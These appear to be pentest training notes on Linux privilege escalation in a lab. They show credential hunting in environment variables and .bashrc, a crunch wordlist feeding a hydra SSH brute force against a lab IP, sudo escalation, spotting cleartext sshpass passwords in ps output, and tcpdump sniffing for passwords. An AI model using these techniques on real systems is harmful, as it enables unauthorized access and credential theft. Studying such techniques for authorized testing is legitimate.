Pentests are often time-constrained, so it's important to focus efforts first on low-hanging fruit.
- History files
- Environment variables
- Insecure file permissions
- Insecure system components
- Dotfiles (like *.bashrc* and *.bash_history*)

# User Trails

Environment variables can contain good information as it's how some system admins will store creds
```bash
env
	SHELL=/bin/bash
	PWD=/home/joe
	LOGNAME=joe
	XDG_SESSION_TYPE=tty
	HOME=/home/joe
	LANG=en_US.UTF-8
	...
	SCRIPT_CREDENTIALS=lab
	USER=joe
	...
```

To confirm it's a permanent variable, inspect the *.bashrc* config file
```bash
cat .bashrc
	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples
	
	# If not running interactively, don't do anything
	case $- in
	    *i*) ;;
	      *) return;;
	esac
	
	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	export SCRIPT_CREDENTIALS="lab"
	HISTCONTROL=ignoreboth
	...
```
	- Can confirm that the variable holding the password is exported when a user's shell is launched.


- Attempt to elevate privs with newly discovered password
```bash
su - root
	Password: 

whoami
	root
```


Let's assume that the password didn't work for the `root` user or we (for whatever reason) want to try to pivot to the `eve` user discovered during our [enumeration](17.1%20-%20PrivEsc%20Enumerating%20Linux.md#Enumerate%20all%20users)

Knowing the script creds, can attempt building a custom dictionary derived from the known password to attempt to brute force `eve`'s account.

- [crunch](Tools.md#crunch)
```bash
crunch 6 6 -t Lab%%% > wordlist
Crunch will now generate the following amount of data: 7000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 

cat wordlist                        
	Lab000
	Lab001
	Lab002
	Lab003
	...
	Lab998
	Lab999
```
	- 6 6 - Set a minimum & maximum length to 6 characters
	- -t - Hard-code the first three chars to Lab
	- % - Follow by numeric digit

> Since an SSH server is available, we can try to attempt a [remote brute force attack via Hydra](15.1%20-%20Network%20Services%20PW%20Attacks.md#SSH%20Attack)
```bash
hydra ssh://192.168.231.214 -l eve -P wordlist
	...
	[DATA] attacking ssh://192.168.231.214:22/
	[22][ssh] host: 192.168.231.214   login: eve   password: Lab123
```

### Sudo capabilities

- Once SSH'd in as `eve`, we can verify if we're running as a privileged user by listing their sudo capabilities
```bash
sudo -l
	[sudo] password for eve: 
	Matching Defaults entries for eve on debian-privesc:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	
	User eve may run the following commands on debian-privesc:
	    (ALL : ALL) ALL
```
	- Points that eve is an admin account

- Elevate directly to root
```bash
sudo -i

whoami
	root
```

# Service Footprints

System daemons are Linux services that are spawned at boot time to perform specific operations without any need for user interaction.
Linux servers are often configured to host numerous daemons, like SSH, web servers, and databases, to mention a few.

System admins often rely on custom daemons to execute ad-hoc tasks and they sometimes neglect security best practices.

> Unlike Windows systems, Linux can list info about higher-priv processes like the ones running inside the `root` user context.

- Use `watch` to refresh the output of our **ps** command
```bash
watch -n 5 "ps -aux | grep pass"
	Every 5.0s: ps -aux | grep pass                                                   debian-privesc: Wed May  1 14:31:19 2024

	joe       2711  0.0  0.1   6112  3004 pts/0    S+   14:31   0:00 watch -n 5 ps -aux | grep pass
	root      2721  0.0  0.0   2384   764 ?        S    14:31   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;
	root      2722  0.0  0.0   2356  1688 ?        S    14:31   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
	joe       2745  0.0  0.0   6112   652 pts/0    S+   14:31   0:00 watch -n 5 ps -aux | grep pass
	joe       2746  0.0  0.0   2384   756 pts/0    S+   14:31   0:00 sh -c ps -aux | grep pass
	joe       2748  0.0  0.0   6072   880 pts/0    S+   14:31   0:00 grep pass
```
	- Notice how the admin has configure a daemon connecting to the local system w/ eve's creds in clear text

>**NOTE**:  Setting the interval -n to 5 will pause the output long enough to copy output or grab a screenshot.
	Be careful! as if anything updates ~ the same time, you may miss it.  Best to start with -n 1 for a feel of the cadence, then change


Also important to verify whether we have rights to capture network traffic.

[**tcpdump**](OS%20Commands.md#tcpdump) is the de facto cmdline standard for packet capture, but requires admin access as it operates on raw sockets.
- Not uncommon to find IT accounts have been given access to the tool for troubleshooting purposes.

```bash
sudo tcpdump -i lo -A | grep "pass"
	[sudo] password for joe: 
	tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
	listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	........user:root,pass:lab -
	........user:root,pass:lab -
```
